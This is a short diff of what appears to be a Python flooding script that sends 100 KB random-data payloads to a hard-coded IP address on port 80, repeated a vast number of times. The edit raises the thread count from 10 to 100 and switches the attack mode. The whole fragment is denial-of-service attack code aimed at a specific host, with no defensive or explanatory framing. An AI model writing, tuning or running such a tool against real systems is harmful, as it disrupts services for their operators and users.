@@ -10,9 +10,9 @@ from multiprocessing.dummy import Pool as ThreadPool
 
 ip = '82.200.161.178'
 port = 80
-choice = '2'
+choice = '3'
 times = 10000000000
-threads = 10
+threads = 100
 def run():
 	data = random._urandom(100*1024)
 	i = random.choice(("[/]","[__]","[/]"))
